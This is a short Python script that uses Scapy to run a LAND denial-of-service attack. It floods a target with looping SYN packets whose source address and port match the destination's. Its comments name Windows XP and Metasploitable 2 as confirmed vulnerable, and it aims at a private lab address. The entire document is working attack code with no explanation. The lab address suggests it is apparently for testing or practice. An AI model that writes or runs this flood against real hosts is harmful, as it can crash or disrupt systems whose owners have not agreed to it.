#! /usr/bin/env python3

#Sends packets with source IP = destination IP and source port = destination port.
#Target: Old OS like Windows XP or Metasploitable 2 (confirmed vulnerable).
from scapy.layers.inet import IP, TCP
from scapy.sendrcv import send

def land(target, port=80):
	pkt = IP(src=target, dst=target)/TCP(sport=port, dport=port, flags='S')
	send(pkt, loop=1)

land("192.168.56.101")
